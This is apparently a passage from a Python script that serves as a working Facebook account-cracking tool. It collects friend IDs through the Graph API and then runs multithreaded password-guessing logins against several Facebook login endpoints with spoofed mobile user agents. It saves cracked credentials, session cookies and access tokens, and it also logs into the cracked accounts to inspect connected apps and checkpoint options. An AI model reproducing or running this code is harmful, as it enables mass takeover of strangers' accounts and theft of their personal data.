      nama = i["name"].rsplit(" ")[0]
      id.append(uid+"<=>"+nama)
  except KeyError:
    exit(" [!] account not available or private friend list")
  print(" [+] total id  : \033[0;91m%s\033[0;97m"%(len(id))) 
 
def follower():
  print('Not Available ')
 
def massal():
  global token
  try:
    token = open("login.txt", "r").read()
  except IOError:
    exit(" [!] token expired")
  try:
    tanya_total = int(raw_input(" [+] number of target id : "))
  except:tanya_total=1
  print("\n [*] fill in 'me' if you want from friends list")
  for t in range(tanya_total):
    t +=1
    idt = raw_input(" [+] target id %s : "%(t))
    try:
      for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
        uid = i["id"]
        nama = i["name"].rsplit(" ")[0]
        id.append(uid+"<=>"+nama)
    except KeyError:
      print(" [!] account not available or private friend list")
  print(" [+] total id  : \033[0;91m%s\033[0;97m"%(len(id)))
 
def method():
  print(" \n [ choose one crack method]\n")
  print(" [1] api method (fast crack)")
  print(" [2] free method (fast crack) [not for BD user]")
  print(" [3] mbasic method (slow crack)")
  print(" [4] mobile method (slow crack)")
  method = raw_input("\n [+] method : ")
  if method == "":
    menu()
  elif method == "1":
    ask = raw_input(" [?] use manual password? y/n: ")
    if ask == "y":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [*] pass example: 102030,556677,786786")
        asu = raw_input(" [?] set pass : ").split(",")
        if len(asu) =="":
          exit(" [!] don't be empty")
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          coeg.submit(api, uid, asu)
      exit("\n\n [#] cracks complete...")
    elif ask == "n":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          if len(name)>=6:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          elif len(name) == 3 or len(name) == 4 or len(name) == 5:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          else:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          coeg.submit(api, uid, pwx)
      exit("\n\n [#] cracks complete...")
  elif method == "2":
    ask = raw_input(" [?] use manual password? y/n: ")
    if ask == "y":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [*] pass example: 102030, 556677, 786786")
        asu = raw_input(" [?] set pass : ").split(",")
        if len(asu) =="":
          exit(" [!] don't be empty")
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          coeg.submit(crack, uid, asu, "https:/free.facebook.com")
      exit("\n\n [#] cracks complete...")
    elif ask == "n":
      with ThreadPoolExecutor(max_workers=35) as coeg:
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          if len(name)>=6:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          elif len(name) == 3 or len(name) == 4 or len(name) == 5:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          else:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          coeg.submit(crack, uid, pwx, "https://free.facebook.com")
      exit("\n\n [#] crack complete...")
  elif method == "3":
    ask = raw_input(" [?] use manual password? y/n: ")
    if ask == "y":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [*] pass example: 102030, 556677, 786786")
        asu = raw_input(" [?] set pass : ").split(",")
        if len(asu) =="":
          exit(" [!] don't be empty")
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          coeg.submit(crack, uid, asu, "https://mbasic.facebook.com")
      exit("\n\n [#] crack complete...")
    elif ask == "n":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          if len(name)>=6:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          elif len(name) == 3 or len(name) == 4 or len(name) == 5:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          else:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          coeg.submit(crack, uid, pwx, "https://mbasic.facebook.com")
      exit("\n\n [#] crack complete...")
  elif method == "4":
    ask = raw_input(" [?] use manual password? y/n: ")
    if ask == "y":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [*] pass example: 102030, 556677, 786786")
        asu = raw_input(" [?] set pass : ").split(",")
        if len(asu) =="":
          exit(" [!] don't be empty")
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          coeg.submit(crack, uid, asu, "https://m.facebook.com")
      exit("\n\n [#] crack complete...")
    elif ask == "n":
      with ThreadPoolExecutor(max_workers=30) as coeg:
        print("\n [+] OK results are saved in : OK/%s.txt"%(tanggal))
        print(" [+] CP results are saved in : CP/%s.txt\n"%(tanggal))
        print(" [!] if no result turn on airplane mode 5 seconds\n")
        for user in id:
          uid, name = user.split("<=>")
          if len(name)>=6:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          elif len(name) == 3 or len(name) == 4 or len(name) == 5:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          else:
            pwx = [ name+"123", name+"1234", name+"12345" ]
          coeg.submit(crack, uid, pwx, "https://m.facebook.com")
      exit("\n\n [#] crack complete...")
    else:
      exit("\n [!] correct content")
  else:
    menu() 
 
def api(uid, pwx):
  try:
    ua = open(".ua", "r").read()
  except IOError:
    ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  global ok, cp, loop, token
  sys.stdout.write(
    "\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
  ); sys.stdout.flush()
  for pw in pwx:
    pw = pw.lower()
    ses = requests.Session()
    headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
    send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
    if "session_key" in send.text and "EAAA" in send.text:
      print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
      ok.append("%s|%s"%(uid, pw))
      open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
      break
    elif "www.facebook.com" in send.json()["error_msg"]:
      try:
        token = open("login.txt", "r").read()
        with requests.Session() as ses:
          ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
          month, day, year = ttl.split("/")
          month = bulan_ttl[month]
          print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
          cp.append("%s|%s"%(uid, pw))
          open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
          break
      except (KeyError, IOError):
        day = (" ")
        month = (" ")
        year = (" ")
      except:pass
      print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
      cp.append("%s|%s"%(uid, pw))
      open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
      break
    else:
      continue
 
  loop += 1
 
def crack(uid, pwx, host, **kwargs):
  try:
    ua = open(".ua", "r").read()
  except IOError:
    ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  global ok, cp, loop, token
  sys.stdout.write(
    "\r [*] crack %s/%s ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
  ); sys.stdout.flush()
  try:
    for pw in pwx:
      kwargs = {}
      pw = pw.lower()
      ses = requests.Session()
      ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
      p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
      b = parser(p,"html.parser")
      bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
      for i in b("input"):
        try:
          if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
          else:continue
        except:pass
      kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
      gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
      if "c_user" in ses.cookies.get_dict().keys():
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        print("\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki))
        ok.append("%s|%s"%(uid, pw))
        open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
        break
      elif "checkpoint" in ses.cookies.get_dict().keys():
        try:
          token = open("login.txt", "r").read()
          with requests.Session() as ses:
            ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
            month, day, year = ttl.split("/")
            month = bulan_ttl[month]
            print("\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year))
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
            break
        except (KeyError, IOError):
          day = (" ")
          month = (" ")
          year = (" ")
        except:pass
        print("\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw))
        cp.append("%s|%s"%(uid, pw))
        open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
        break
      else:
        continue
 
    loop+=1
  except Exception as e:
    if "free.facebook.com" in host:
      return crack(uid, pwx, host)
    else:
      return crack(uid, pwx, "https://free.facebook.com")
 
def setting_ua():
  print("\n [ choose your phone user agent ]\n")
  print(" [1] Xiaomi")
  print(" [2] Samsung")
  print(" [3] Nokia")
  print(" [4] Symphone")
  print(" [5] Huawei")
  print(" [6] Manual user-agent")
  ua = raw_input("\n [?] choose : ")
  if ua =="":
    menu()
  elif ua == "1":
    c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  elif ua == "2":
    c_ua = ("Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  elif ua == "3":
    c_ua = ("Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  elif ua == "4":
    c_ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  elif ua == "5":
    c_ua = ("[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  elif ua == "6":
    c_ua = raw_input(" [+] user-agent : ")
    if c_ua == "":
      exit("\n [!] don't be empty")
    open(".ua", "w").write(c_ua)
    time.sleep(1)
    raw_input("\n [+] successfully changed user agent")
    menu()
  else:
    menu()
 
#-> Check Options
def cek_opsi():
  print("\n [*] input file (ex: CP/%s.txt)"%(tanggal))
  files = raw_input(" [?] nama file  : ")
  if files == "":
    menu()
  try:
    buka_baju = open(files, "r").readlines()
  except IOError:
    exit("\n [!] file name %s not available"%(files))
  print(" [+] total account  : \033[0;91m%s\033[0;97m"%(len(buka_baju)))
  print(" [*] in the process of checking the account....")
  for memek in buka_baju:
    kontol = memek.replace("\n","")
    titid  = kontol.split("|")
    print("\n [+] check account : \033[0;93m%s\033[0;97m"%(kontol.replace("  * --> ","")))
    try:
      check_in(titid[0].replace("  * --> ",""), titid[1])
    except requests.exceptions.ConnectionError:
      pass
  print("\n [!] account check done...")
  raw_input(" [+] pencet enter untuk kembali ke menu ")
  time.sleep(1)
  menu()
 
def check_in(user, pasw):
  mb = ("https://mbasic.facebook.com")
  ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
  ses = requests.Session()
  #-> separator
  ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
  data = {}
  ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
  fm = ged.find("form",{"method":"post"})
  list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  for i in fm.find_all("input"):
    if i.get("name") in list:
      data.update({i.get("name"):i.get("value")})
    else:
      continue
  data.update({"email":user,"pass":pasw})
  run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
  if "c_user" in ses.cookies:
    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
    run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
    xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
    print(" [+] aplikasi terhubung ada : "+str(len(xe)))
    num = 0
    for _ in xe:
      num += 1
      print("   "+str(num)+" "+_[0][0]+", "+_[0][1])
  elif "checkpoint" in ses.cookies:
    form = run.find("form")
    dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
    jzst = form.find("input",{"name":"jazoest"})["value"]
    nh   = form.find("input",{"name":"nh"})["value"]
    dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
    xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
    ngew = [yy.text for yy in xnxx.find_all("option")]
    print(" [+] terdapat "+str(len(ngew))+" opsi ")
    for opt in range(len(ngew)):
      print(" ["+str(opt+1)+"] "+ngew[opt])
  elif "login_error" in str(run):
    oh = run.find("div",{"id":"login_error"}).find("div").text
    print(" [!] %s"%(oh))
  else:
    print(" [!] login failed, please check your id and password again")
  
def buat_folder():
  try:os.mkdir("CP")
  except:pass
  try:os.mkdir("OK")
  except:pass
 
if __name__ == "__main__":
  os.system("git pull")
  os.system("touch login.txt")
  buat_folder()
  login()
 
